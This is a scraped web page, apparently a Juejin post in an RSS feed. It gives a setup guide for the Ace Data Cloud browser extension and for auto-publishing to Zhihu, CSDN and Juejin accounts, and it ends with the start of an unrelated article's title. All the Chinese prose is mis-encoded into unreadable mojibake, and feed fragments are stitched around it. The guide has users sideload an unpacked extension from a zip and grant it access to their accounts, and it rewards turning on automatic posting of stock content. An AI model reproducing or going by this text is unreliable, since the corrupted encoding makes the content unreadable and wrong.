                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>æ´»åŠ¨ï¼š2026.1.21~2026.1.27 æœŸé—´å¼€é€šè‡ªåŠ¨å‘å¸ƒå¹¶æˆåŠŸæˆªå›¾ï¼Œå¯è·å¾—æ¯æ—¥<strong>æœ€é«˜ 50 ç§¯åˆ†â‰ˆï¿¥48</strong>å¥–åŠ±ï¼ˆå‘å¸ƒä¸€ä¸ªå¹³å° 10 ç§¯åˆ†ï¼‰ï¼Œæ¯æ—¥ç»Ÿè®¡ï¼Œå¯ä»¥å åŠ ã€‚</p>
</blockquote>
<p>æœ¬ SOP ç”¨äºæŒ‡å¯¼å›¢é˜Ÿå®Œæˆä¸¤ä»¶äº‹ï¼š<br/>
1ï¼‰å®‰è£… Ace Data Cloud æµè§ˆå™¨æ’ä»¶å¹¶å®Œæˆè´¦å·æˆæƒï¼›<br/>
2ï¼‰åœ¨ Ace Data Cloud å¹³å°å®Œæˆé¢‘é“ç»‘å®šã€å†…å®¹å‡†å¤‡ã€å‘å¸ƒä¸è‡ªåŠ¨å‘å¸ƒã€‚</p>
<hr/>
<h2 data-id="heading-0">1. ç›®æ ‡ä¸æ¦‚è¿°</h2>
<ul>
<li><strong>ç›®æ ‡</strong>ï¼šé€šè¿‡ Ace Data Cloud å¹³å°ï¼Œå°†æ–‡ç« /è§†é¢‘ç­‰å†…å®¹åˆ†å‘åˆ°å¤šä¸ªè‡ªåª’ä½“å¹³å°ï¼ˆé¢‘é“ï¼‰ï¼Œæå‡åˆ†å‘æ•ˆç‡ï¼Œå¹¶é€šè¿‡è‡ªåŠ¨å‘å¸ƒå®ç°â€œä½äººå·¥æŠ•å…¥â€çš„æŒç»­æ¨å¹¿ã€‚</li>
<li><strong>å‰ç½®æ¡ä»¶</strong>ï¼š
<ul>
<li>ä½¿ç”¨ Chrome æµè§ˆå™¨</li>
<li>å¯è®¿é—® Ace Data Cloud å¹³å°</li>
<li>å·²ä¸‹è½½æµè§ˆå™¨æ’ä»¶å‹ç¼©åŒ…å¹¶è§£å‹</li>
<li><strong>æµè§ˆå™¨æ’ä»¶é…ç½®æ–‡æ¡£ï¼ˆå¹³å°å†…ï¼‰</strong>ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fplatform.acedata.cloud%2Fdocuments%2F6becb82d-5981-4c21-a596-39e751647fb1" target="_blank" title="https://platform.acedata.cloud/documents/6becb82d-5981-4c21-a596-39e751647fb1" ref="nofollow noopener noreferrer">é“¾æ¥</a></li>
</ul>
</li>
</ul>
<hr/>
<h2 data-id="heading-1">2. æ ¸å¿ƒæ¦‚å¿µè¯´æ˜</h2>
<ul>
<li><strong>æµè§ˆå™¨æ’ä»¶</strong>ï¼šç”¨äºåœ¨ç¬¬ä¸‰æ–¹å¹³å°ï¼ˆå¦‚çŸ¥ä¹ã€CSDN ç­‰ï¼‰å®Œæˆè´¦å·æˆæƒï¼Œä½¿ Ace Data Cloud èƒ½ä»£è¡¨ä½ æ‰§è¡Œå‘å¸ƒã€‚</li>
<li><strong>é¢‘é“ï¼ˆChannelsï¼‰</strong>ï¼šç›®æ ‡å‘å¸ƒå¹³å°çš„è´¦å·æˆæƒé€šé“ï¼ˆå¦‚çŸ¥ä¹ã€CSDNã€æ˜é‡‘ç­‰ï¼‰ã€‚</li>
<li><strong>ææ–™ï¼ˆMaterialsï¼‰</strong>ï¼šå¹³å°æä¾›çš„å¯ç›´æ¥ä½¿ç”¨/å‚è€ƒçš„é¢„åˆ¶å†…å®¹åº“ã€‚</li>
<li><strong>æ–‡æ¡£ï¼ˆDocsï¼‰</strong>ï¼šä½ å‡†å¤‡å‘å¸ƒçš„å†…å®¹è‰ç¨¿ï¼ˆå¯ç”±ææ–™ç”Ÿæˆï¼Œä¹Ÿå¯è‡ªå·±åˆ›å»ºï¼‰ã€‚</li>
<li><strong>å‘å¸ƒä»»åŠ¡ï¼ˆTasksï¼‰</strong>ï¼šæ¯ä¸€æ¬¡å‘å¸ƒæ“ä½œç”Ÿæˆçš„è®°å½•ï¼Œç”¨äºè¿½è¸ªçŠ¶æ€ã€é“¾æ¥ä¸ç»“æœã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-2">3. æ’ä»¶å®‰è£… SOP</h2>
<h3 data-id="heading-3">3.1 ä¸‹è½½æ’ä»¶</h3>
<ol>
<li>è®¿é—®ä¸‹è½½é“¾æ¥å¹¶ä¸‹è½½å‹ç¼©åŒ…ï¼š
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcdn.acedata.cloud%2Fi9h4af.zip" target="_blank" title="https://cdn.acedata.cloud/i9h4af.zip" ref="nofollow noopener noreferrer">cdn.acedata.cloud/i9h4af.zip</a></li>
</ul>
</li>
<li>è§£å‹åå¾—åˆ°ä¸€ä¸ªæ’ä»¶æ–‡ä»¶å¤¹ï¼ˆä¿æŒæ–‡ä»¶å¤¹ç»“æ„ä¸å˜ï¼‰ã€‚</li>
</ol>
<h3 data-id="heading-4">3.2 å®‰è£…æ’ä»¶ï¼ˆChromeï¼‰</h3>
<ol>
<li>åœ¨ Chrome åœ°å€æ è¾“å…¥ï¼š<code>chrome://extensions</code></li>
<li>æ‰“å¼€å³ä¸Šè§’ <strong>å¼€å‘è€…æ¨¡å¼ï¼ˆDeveloper modeï¼‰</strong></li>
<li>ç‚¹å‡» <strong>Load unpackedï¼ˆåŠ è½½å·²è§£å‹çš„æ‰©å±•ç¨‹åºï¼‰</strong></li>
<li>é€‰æ‹©ä½ åˆšåˆšè§£å‹å‡ºæ¥çš„æ’ä»¶æ–‡ä»¶å¤¹å¹¶ç¡®è®¤</li>
</ol>
<h3 data-id="heading-5">3.3 å®‰è£…æˆåŠŸéªŒè¯</h3>
<ol>
<li>æ‰“å¼€ Ace Data Cloud åˆ†å‘ä¸­å¿ƒé¡µé¢å¹¶åˆ·æ–°ï¼š
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fplatform.acedata.cloud%2Fconsole%2Fpublish" target="_blank" title="https://platform.acedata.cloud/console/publish" ref="nofollow noopener noreferrer">platform.acedata.cloud/console/pubâ€¦</a></li>
</ul>
</li>
<li>å¦‚æœé¡µé¢ä¸å†å‡ºç°â€œæœªå®‰è£…æµè§ˆå™¨æ’ä»¶â€çš„æç¤ºï¼Œåˆ™å®‰è£…æˆåŠŸã€‚</li>
</ol>
<hr/>
<h2 data-id="heading-6">4. å†…å®¹å‘å¸ƒå¹³å° SOPï¼ˆå«æˆªå›¾ï¼‰</h2>
<blockquote>
<p>ä»¥ä¸‹ SOP ä»¥å¹³å°é¡µé¢ä¸ºä¸»çº¿ï¼š<strong>åˆ†å‘ä¸­å¿ƒ â†’ é¢‘é“ â†’ æ–‡æ¡£/ææ–™ â†’ å‘å¸ƒä»»åŠ¡ â†’ è‡ªåŠ¨å‘å¸ƒ</strong><br/>
æˆªå›¾è¯´æ˜ï¼š</p>
<ul>
<li>æˆªå›¾1ï¼šå‘å¸ƒä¸­å¿ƒ</li>
<li>æˆªå›¾2ï¼šé¢‘é“ç®¡ç†</li>
<li>æˆªå›¾3ï¼šå‘å¸ƒä»»åŠ¡</li>
<li>æˆªå›¾4ï¼šå‘å¸ƒæ¦‚è§ˆ/æ‘˜è¦</li>
</ul>
</blockquote>
<hr/>
<h3 data-id="heading-7">4.1 æ­¥éª¤ä¸€ï¼šè¿›å…¥å‘å¸ƒä¸­å¿ƒï¼ˆæ€»è§ˆä¸è‡ªåŠ¨å‘å¸ƒå¼€å…³ï¼‰</h3>
<ul>
<li><strong>ç›®æ ‡</strong>ï¼šç¡®è®¤æ’ä»¶çŠ¶æ€æ­£å¸¸ï¼Œå¹¶äº†è§£â€œè‡ªåŠ¨å‘å¸ƒâ€å…¥å£ä¸æ•´ä½“çŠ¶æ€ã€‚</li>
</ul>
<p><strong>æ“ä½œï¼š</strong></p>
<ol>
<li>è¿›å…¥åˆ†å‘ä¸­å¿ƒï¼š <a href="https://link.juejin.cn?target=https%3A%2F%2Fplatform.acedata.cloud%2Fconsole%2Fpublish" target="_blank" title="https://platform.acedata.cloud/console/publish" ref="nofollow noopener noreferrer">platform.acedata.cloud/console/pubâ€¦</a></li>
<li>æ£€æŸ¥æ˜¯å¦å­˜åœ¨â€œæœªå®‰è£…æ’ä»¶â€ç­‰å¼‚å¸¸æç¤º</li>
<li>ç†Ÿæ‚‰é¡µé¢å†…çš„è‡ªåŠ¨å‘å¸ƒæ¨¡å—ã€æ•´ä½“æ¦‚è§ˆä¿¡æ¯</li>
</ol>
<p><strong>æ£€æŸ¥ç‚¹ï¼š</strong></p>
<ul>
<li>é¡µé¢æ­£å¸¸æ˜¾ç¤ºï¼Œæ— æ’ä»¶ç¼ºå¤±æç¤º</li>
<li>èƒ½çœ‹åˆ°è‡ªåŠ¨å‘å¸ƒæ¨¡å—ï¼ˆå¼€å…³/è¯´æ˜ï¼‰</li>
</ul>
<p><strong>æˆªå›¾1ï¼ˆå‘å¸ƒä¸­å¿ƒï¼‰</strong><br/>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/21c5c59e8ef74af8bc3af00d8b043f10~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bSU5bqG5omN5Lio6Z2Z6KeF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769528661&amp;x-signature=MUBCwtg7TjQsYEpjQalh%2Bh%2BcwyI%3D" alt="æˆªå›¾1-å‘å¸ƒä¸­å¿ƒ" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-8">4.2 æ­¥éª¤äºŒï¼šç»‘å®šå‘å¸ƒé¢‘é“ï¼ˆæˆæƒç¬¬ä¸‰æ–¹è´¦å·ï¼‰</h3>
<ul>
<li><strong>ç›®æ ‡</strong>ï¼šå°†ç¬¬ä¸‰æ–¹å¹³å°è´¦å·æˆæƒç»™ Ace Data Cloudï¼Œå»ºç«‹å‘å¸ƒé€šé“ã€‚</li>
</ul>
<p><strong>æ“ä½œï¼š</strong></p>
<ol>
<li>è¿›å…¥é¢‘é“é¡µé¢ï¼š <a href="https://link.juejin.cn?target=https%3A%2F%2Fplatform.acedata.cloud%2Fconsole%2Fpublish%2Fchannels" target="_blank" title="https://platform.acedata.cloud/console/publish/channels" ref="nofollow noopener noreferrer">platform.acedata.cloud/console/pubâ€¦</a></li>
<li>æ‰¾åˆ°éœ€è¦ç»‘å®šçš„å¹³å°ï¼ˆå¦‚çŸ¥ä¹ã€CSDN ç­‰ï¼‰</li>
<li>ç‚¹å‡» <strong>ç»‘å®š</strong>ï¼ŒæŒ‰æç¤ºå®Œæˆç¬¬ä¸‰æ–¹å¹³å°ç™»å½•ä¸æˆæƒ</li>
<li>ç»‘å®šæˆåŠŸåï¼Œé¢‘é“çŠ¶æ€åº”å˜ä¸º <strong>æœ‰æ•ˆ</strong></li>
</ol>
<p><strong>æ£€æŸ¥ç‚¹ï¼š</strong></p>
<ul>
<li>ç›®æ ‡å¹³å°é¢‘é“çŠ¶æ€æ˜¾ç¤º <strong>æœ‰æ•ˆ</strong></li>
<li>å¯ç»‘å®šå¤šä¸ªé¢‘é“ä»¥å®ç°â€œä¸€æ–‡å¤šå‘â€</li>
</ul>
<p><strong>æˆªå›¾2ï¼ˆé¢‘é“ç®¡ç†ï¼‰</strong><br/>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/36408134ab9247d0bca180200dbd336f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bSU5bqG5omN5Lio6Z2Z6KeF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769528661&amp;x-signature=ADF2wbJVEvDIO1fOOooZezwpUTA%3D" alt="æˆªå›¾2-é¢‘é“ç®¡ç†" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-9">4.3 æ­¥éª¤ä¸‰ï¼šå‡†å¤‡å†…å®¹ï¼ˆä»ææ–™åº“åˆ›å»ºæ–‡æ¡£ / ç¼–è¾‘æ–‡æ¡£ï¼‰</h3>
<ul>
<li><strong>ç›®æ ‡</strong>ï¼šè·å¾—å¯å‘å¸ƒçš„æ–‡ç« è‰ç¨¿ï¼Œå¹¶è¿›è¡Œå¿…è¦ç¼–è¾‘ã€‚</li>
</ul>
<p><strong>å¸¸è§è·¯å¾„ Aï¼šä»ææ–™åº“é€‰å–å¹¶ç”Ÿæˆæ–‡æ¡£</strong></p>
<ol>
<li>åœ¨â€œææ–™â€åº“ä¸­æµè§ˆ/æœç´¢å†…å®¹</li>
<li>æŸ¥çœ‹æ ‡é¢˜ã€å†…å®¹ä¸æ”¯æŒé¢‘é“</li>
<li>ç‚¹å‡» <strong>é¢„è§ˆ</strong>ç¡®è®¤å†…å®¹é€‚ç”¨</li>
<li>ç‚¹å‡» <strong>ä½¿ç”¨</strong>ï¼šç³»ç»Ÿä¼šå°†ææ–™å¤åˆ¶åˆ°ä½ çš„â€œæ–‡æ¡£â€åˆ—è¡¨ï¼Œå½¢æˆå¯ç¼–è¾‘è‰ç¨¿</li>
</ol>
<p><strong>å¸¸è§è·¯å¾„ Bï¼šåˆ›å»ºåŸåˆ›æ–‡æ¡£ï¼ˆå¦‚å¹³å°æ”¯æŒâ€œæ–°å»ºæ–‡æ¡£â€ï¼‰</strong></p>
<ol>
<li>åœ¨â€œæ–‡æ¡£â€é¡µé¢ç‚¹å‡» <strong>æ–°å»º</strong></li>
<li>è¾“å…¥æ ‡é¢˜ä¸æ­£æ–‡ï¼Œä¿å­˜ä¸ºè‰ç¨¿</li>
</ol>
<p><strong>æ£€æŸ¥ç‚¹ï¼š</strong></p>
<ul>
<li>æ–‡æ¡£å·²ç”Ÿæˆå¹¶å¯è¿›å…¥ç¼–è¾‘é¡µ</li>
<li>æ ‡é¢˜ã€æ­£æ–‡ã€æ ¼å¼ç¬¦åˆç›®æ ‡å¹³å°å‘å¸ƒè¦æ±‚</li>
</ul>
<hr/>
<h3 data-id="heading-10">4.4 æ­¥éª¤å››ï¼šæ‰‹åŠ¨å‘å¸ƒï¼ˆé€‰æ‹©é¢‘é“å¹¶ç”Ÿæˆå‘å¸ƒä»»åŠ¡ï¼‰</h3>
<ul>
<li><strong>ç›®æ ‡</strong>ï¼šå°†æŒ‡å®šæ–‡æ¡£å‘å¸ƒåˆ°å·²ç»‘å®šçš„å¤šä¸ªé¢‘é“ã€‚</li>
</ul>
<p><strong>æ“ä½œï¼š</strong></p>
<ol>
<li>åœ¨â€œæ–‡æ¡£â€åˆ—è¡¨æ‰¾åˆ°ç›®æ ‡æ–‡ç« </li>
<li>è¿›å…¥ç¼–è¾‘é¡µå®Œæˆæœ€ç»ˆæ£€æŸ¥ï¼ˆæ ‡é¢˜ä¼˜åŒ–ã€æ’ç‰ˆã€é“¾æ¥ç­‰ï¼‰</li>
<li>ç‚¹å‡» <strong>å‘å¸ƒ</strong></li>
<li>åœ¨å¼¹çª—ä¸­å‹¾é€‰è¦å‘å¸ƒçš„ <strong>é¢‘é“</strong></li>
<li>ç¡®è®¤å‘å¸ƒ â†’ ç³»ç»Ÿåˆ›å»º <strong>å‘å¸ƒä»»åŠ¡</strong></li>
</ol>
<p><strong>æ£€æŸ¥ç‚¹ï¼š</strong></p>
<ul>
<li>å‘å¸ƒä»»åŠ¡å·²ç”Ÿæˆ</li>
<li>çŠ¶æ€ä»â€œè¿›è¡Œä¸­â€å˜ä¸ºâ€œå·²å®Œæˆâ€</li>
<li>å¯ç‚¹å‡»ä»»åŠ¡ä¸­çš„é“¾æ¥ï¼Œè·³è½¬ç¬¬ä¸‰æ–¹å¹³å°ç¡®è®¤æ–‡ç« å·²å‘å¸ƒ</li>
</ul>
<hr/>
<h3 data-id="heading-11">4.5 æ­¥éª¤äº”ï¼šæŸ¥çœ‹å‘å¸ƒä»»åŠ¡ï¼ˆè¿½è¸ªçŠ¶æ€ä¸ç»“æœé“¾æ¥ï¼‰</h3>
<ul>
<li><strong>ç›®æ ‡</strong>ï¼šç»Ÿä¸€æŸ¥çœ‹æ‰‹åŠ¨/è‡ªåŠ¨å‘å¸ƒçš„å†å²ä¸ç»“æœã€‚</li>
</ul>
<p><strong>æ“ä½œï¼š</strong></p>
<ol>
<li>è¿›å…¥å‘å¸ƒä»»åŠ¡é¡µé¢ï¼ˆæˆ–ä»åˆ†å‘ä¸­å¿ƒè¿›å…¥ä»»åŠ¡åˆ—è¡¨ï¼‰</li>
<li>æŸ¥çœ‹ä»»åŠ¡çŠ¶æ€ã€å‘å¸ƒæ—¶é—´ã€ç›®æ ‡é¢‘é“ä¸å¤–é“¾</li>
<li>å¼‚å¸¸ä»»åŠ¡æ ¹æ®æç¤ºé‡è¯•æˆ–é‡æ–°æˆæƒé¢‘é“</li>
</ol>
<p><strong>æ£€æŸ¥ç‚¹ï¼š</strong></p>
<ul>
<li>ä»»åŠ¡çŠ¶æ€æ¸…æ™°å¯è¿½è¸ª</li>
<li>å·²å®Œæˆä»»åŠ¡å…·å¤‡å¯è®¿é—®çš„å¤–é“¾</li>
</ul>
<p><strong>æˆªå›¾3ï¼ˆå‘å¸ƒä»»åŠ¡ï¼‰</strong><br/>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5911dbfe92bb41888f648db8d1122b8e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bSU5bqG5omN5Lio6Z2Z6KeF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769528661&amp;x-signature=zi%2F8Ae7pfEQFQB90V2qS9ZvFLtc%3D" alt="æˆªå›¾3-å‘å¸ƒä»»åŠ¡" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-12">4.6 æ­¥éª¤å…­ï¼šå¯ç”¨è‡ªåŠ¨å‘å¸ƒï¼ˆå…¨è‡ªåŠ¨åˆ†å‘ï¼‰</h3>
<ul>
<li><strong>ç›®æ ‡</strong>ï¼šå¼€å¯è‡ªåŠ¨å‘å¸ƒåï¼Œç³»ç»ŸæŒ‰è§„åˆ™è‡ªåŠ¨é€‰å–å†…å®¹å¹¶å‘å¸ƒåˆ°â€œæœ‰æ•ˆé¢‘é“â€ã€‚</li>
</ul>
<p><strong>æ“ä½œï¼š</strong></p>
<ol>
<li>è¿”å› <strong>å‘å¸ƒä¸­å¿ƒ</strong></li>
<li>æ‰¾åˆ° <strong>è‡ªåŠ¨å‘å¸ƒ</strong> æ¨¡å—</li>
<li>å°†å¼€å…³ä»â€œå…³é—­â€æ‹¨åŠ¨è‡³â€œæ‰“å¼€â€</li>
<li>åç»­å®šæœŸåˆ°â€œå‘å¸ƒä»»åŠ¡â€ç¡®è®¤ç³»ç»Ÿè‡ªåŠ¨åˆ›å»ºçš„ä»»åŠ¡ä¸å®Œæˆæƒ…å†µ</li>
</ol>
<p><strong>æ£€æŸ¥ç‚¹ï¼š</strong></p>
<ul>
<li>è‡ªåŠ¨å‘å¸ƒå¼€å…³å¤„äºå¼€å¯çŠ¶æ€</li>
<li>å‘å¸ƒä»»åŠ¡ä¸­æŒç»­å‡ºç°è‡ªåŠ¨ä»»åŠ¡è®°å½•</li>
</ul>
<p><strong>æˆªå›¾4ï¼ˆå‘å¸ƒæ¦‚è§ˆ/æ‘˜è¦ï¼‰</strong><br/>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dfc63044672d4cd5a054d21d961320cd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bSU5bqG5omN5Lio6Z2Z6KeF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769528661&amp;x-signature=vVBfxYg9TsyQvInP35ybHkDQg%2FY%3D" alt="æˆªå›¾4-å‘å¸ƒæ¦‚è§ˆ" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-13">5. å¸¸è§é—®é¢˜ï¼ˆFAQï¼‰</h2>
<h3 data-id="heading-14">Q1ï¼šé¢‘é“ç»‘å®šå¤±è´¥ / çŠ¶æ€æ˜¾ç¤ºâ€œå·²è¿‡æœŸâ€æ€ä¹ˆåŠï¼Ÿ</h3>
<ul>
<li>å»ºè®®æ“ä½œï¼šå…ˆ <strong>è§£ç»‘</strong> å† <strong>é‡æ–°ç»‘å®š</strong>ï¼ŒæŒ‰é¡µé¢æç¤ºé‡æ–°å®Œæˆæˆæƒç™»å½•ã€‚</li>
<li>è‹¥ä»å¤±è´¥ï¼šæ£€æŸ¥æµè§ˆå™¨æ’ä»¶æ˜¯å¦å®‰è£…å¯ç”¨ã€ç¬¬ä¸‰æ–¹å¹³å°æ˜¯å¦è§¦å‘é£æ§/äºŒæ¬¡éªŒè¯ã€‚</li>
</ul>
<h3 data-id="heading-15">Q2ï¼šå¯ä»¥å‘å¸ƒæˆ‘è‡ªå·±å†™çš„åŸåˆ›æ–‡ç« å—ï¼Ÿ</h3>
<ul>
<li>å¯ä»¥ã€‚ä¸€èˆ¬åœ¨â€œæ–‡æ¡£â€é¡µé¢æ”¯æŒ <strong>æ–°å»ºæ–‡æ¡£</strong>ï¼Œåˆ›å»ºåæŒ‰â€œæ‰‹åŠ¨å‘å¸ƒâ€æµç¨‹å‘å¸ƒã€‚</li>
</ul>
<h3 data-id="heading-16">Q3ï¼šè‡ªåŠ¨å‘å¸ƒçš„å†…å®¹ä¸å–œæ¬¢ï¼Œå¯ä»¥å¹²é¢„å—ï¼Ÿ</h3>
<ul>
<li>å¯ä»¥ã€‚éšæ—¶å…³é—­å‘å¸ƒä¸­å¿ƒçš„ <strong>è‡ªåŠ¨å‘å¸ƒ</strong> å¼€å…³ã€‚</li>
<li>åŒæ—¶ä½ ä¹Ÿå¯ä»¥åªç»‘å®šä½ å¸Œæœ›è‡ªåŠ¨åˆ†å‘çš„å¹³å°é¢‘é“ï¼Œå‡å°‘ä¸æœŸæœ›çš„å¹³å°è¦†ç›–ã€‚</li>
</ul>
<h3 data-id="heading-17">Q4ï¼šå¦‚ä½•æŸ¥çœ‹å‘å¸ƒæ•ˆæœï¼ˆé˜…è¯»é‡/äº’åŠ¨ç­‰ï¼‰ï¼Ÿ</h3>
<ul>
<li>åœ¨ <strong>å‘å¸ƒä»»åŠ¡</strong> ä¸­ç‚¹å‡»å¤–é“¾è¿›å…¥ç¬¬ä¸‰æ–¹å¹³å°æŸ¥çœ‹æ•°æ®ï¼›</li>
<li>å¹³å°å†…è‹¥æœ‰ç»Ÿè®¡æ¨¡å—ï¼Œä¹Ÿå¯åœ¨æ¦‚è§ˆ/æŠ¥è¡¨ä¸­æŸ¥çœ‹æ±‡æ€»ã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-18">6. æ€»ç»“ï¼ˆæœ€çŸ­è·¯å¾„ï¼‰</h2>
<ul>
<li><strong>æ’ä»¶å®‰è£…æˆåŠŸ</strong> â†’ <strong>ç»‘å®šé¢‘é“ï¼ˆæœ‰æ•ˆï¼‰</strong> â†’ <strong>å‡†å¤‡æ–‡æ¡£</strong> â†’ <strong>å‘å¸ƒå¹¶æŸ¥çœ‹ä»»åŠ¡</strong> â†’ ï¼ˆå¯é€‰ï¼‰<strong>å¼€å¯è‡ªåŠ¨å‘å¸ƒ</strong></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[D2C çš„å¦ä¸€ç§é€‰æ‹©â€”Figma MCP + Claude Code]]></title>    <link>https://juejin.cn/post/7597253913249038377</link>    <guid>https://juejin.cn/post/7597253913249038377</guid>    <pubDate>2026-01-20T15:49:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597253913249038377" data-draft-id="7597252004714086442" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="D2C çš„å¦ä¸€ç§é€‰æ‹©â€”Figma MCP + Claude Code"/> <meta itemprop="keywords" content="AIGC,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-20T15:49:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¸‰é‡‘å¾—é‘«"/> <meta itemprop="url" content="https://juejin.cn/user/4406498335130216"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            D2C çš„å¦ä¸€ç§é€‰æ‹©â€”Figma MCP + Claude Code
